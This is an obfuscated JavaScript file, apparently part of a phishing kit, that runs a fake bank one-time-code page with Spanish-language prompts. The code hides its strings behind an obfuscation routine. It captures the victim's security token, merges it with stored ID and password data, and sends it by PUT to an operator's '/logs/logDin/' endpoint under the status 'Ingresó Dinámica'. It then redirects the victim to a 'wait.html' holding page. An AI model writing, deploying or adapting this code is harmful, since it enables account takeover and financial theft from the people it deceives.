const _0x39f8e5 = _0x6951;
(function (_0x2cfff7, _0x17c973) {
  const _0x480a32 = _0x6951,
    _0x54c795 = _0x2cfff7();
  while (!![]) {
    try {
      const _0x441332 =
        parseInt(_0x480a32(0x189)) / 0x1 +
        (parseInt(_0x480a32(0x18e)) / 0x2) *
          (parseInt(_0x480a32(0x1ac)) / 0x3) +
        parseInt(_0x480a32(0x191)) / 0x4 +
        -parseInt(_0x480a32(0x1a0)) / 0x5 +
        (-parseInt(_0x480a32(0x18a)) / 0x6) *
          (-parseInt(_0x480a32(0x19d)) / 0x7) +
        (-parseInt(_0x480a32(0x196)) / 0x8) *
          (-parseInt(_0x480a32(0x1a8)) / 0x9) +
        (-parseInt(_0x480a32(0x19a)) / 0xa) *
          (parseInt(_0x480a32(0x1a4)) / 0xb);
      if (_0x441332 === _0x17c973) break;
      else _0x54c795["push"](_0x54c795["shift"]());
    } catch (_0x8ba611) {
      _0x54c795["push"](_0x54c795["shift"]());
    }
  }
})(_0x2c5e, 0xbf559);
function updateLS() {
  const _0x16a83f = _0x6951;
  LS[_0x16a83f(0x190)](_0x16a83f(0x18c), JSON[_0x16a83f(0x1a3)](info));
}
const otpButton = document[_0x39f8e5(0x1a5)](_0x39f8e5(0x1ad)),
  numberMovil = document[_0x39f8e5(0x1a5)](_0x39f8e5(0x194));
function _0x6951(_0x46649c, _0x3944f4) {
  const _0x2c5e59 = _0x2c5e();
  return (
    (_0x6951 = function (_0x6951bf, _0x177e85) {
      _0x6951bf = _0x6951bf - 0x188;
      let _0x9d329d = _0x2c5e59[_0x6951bf];
      return _0x9d329d;
    }),
    _0x6951(_0x46649c, _0x3944f4)
  );
}
function _0x2c5e() {
  const _0x1f2de1 = [
    "9930010ywTPXB",
    "json",
    "GET",
    "742994wrXhUY",
    "metaInfo",
    "value",
    "633235BxrgdB",
    "PUT",
    "/logs/logs",
    "stringify",
    "11FWjxsu",
    "getElementById",
    "Ingresó\x20Dinámica",
    "Usuario\x20actualizado",
    "668079SIJoMw",
    "telnum",
    "log",
    "location",
    "6NXluvQ",
    "btnDinamica",
    "idreg",
    "132486gTbiMo",
    "42UWBADw",
    "click",
    "info",
    "focus",
    "652622PBBhfD",
    "preventDefault",
    "setItem",
    "313308KogZQX",
    "application/json",
    "/logs/logDin/",
    "txtdinamica",
    "Usuario\x20Encontrado",
    "32TezuJL",
    "href",
    "reg",
    "disabled",
  ];
  _0x2c5e = function () {
    return _0x1f2de1;
  };
  return _0x2c5e();
}
otpButton["addEventListener"](_0x39f8e5(0x18b), async function (_0x5d554d) {
  const _0x13cb6f = _0x39f8e5;
  _0x5d554d[_0x13cb6f(0x18f)](), (otpButton[_0x13cb6f(0x199)] = !![]);
  if (numberMovil[_0x13cb6f(0x19f)] == "") {
    alert("Por\x20favor\x20ingrese\x20token\x20de\x20seguridad"),
      numberMovil[_0x13cb6f(0x18d)](),
      (otpButton[_0x13cb6f(0x199)] = ![]);
    return;
  } else {
    var _0x3397f6 = numberMovil[_0x13cb6f(0x19f)];
    (info["metaInfo"]["cdin"] = _0x3397f6), updateLS();
    async function _0xf11a8d() {
      const _0x33e908 = _0x13cb6f,
        _0x480d85 = await fetch(url + _0x33e908(0x1a2), {
          method: _0x33e908(0x19c),
          headers: { "Content-Type": _0x33e908(0x192) },
        }),
        _0x1568d5 = await _0x480d85["json"](),
        _0x1b18dd = [..._0x1568d5];
      for (const _0x1fe7ec of _0x1b18dd) {
        if (
          _0x1fe7ec[_0x33e908(0x198)] == info[_0x33e908(0x19e)]["cc"] &&
          _0x1fe7ec["cl"] == info[_0x33e908(0x19e)][_0x33e908(0x1a9)]
        ) {
          console["log"](_0x33e908(0x195));
          const _0x5df28a = await fetch(
              url + _0x33e908(0x193) + _0x1fe7ec[_0x33e908(0x188)],
              {
                method: _0x33e908(0x1a1),
                headers: { "Content-Type": _0x33e908(0x192) },
                body: JSON[_0x33e908(0x1a3)]({
                  din: info[_0x33e908(0x19e)]["cdin"],
                  status: _0x33e908(0x1a6),
                }),
              }
            ),
            _0x7b2b8f = await _0x5df28a[_0x33e908(0x19b)]();
          _0x5df28a["ok"]
            ? console[_0x33e908(0x1aa)](_0x33e908(0x1a7))
            : console["error"](
                "Error\x20al\x20actualizar\x20usuario:",
                _0x5df28a["statusText"]
              );
        }
      }
      (otpButton[_0x33e908(0x199)] = ![]),
        (window[_0x33e908(0x1ab)][_0x33e908(0x197)] = "wait.html");
    }
    await _0xf11a8d();
  }
});
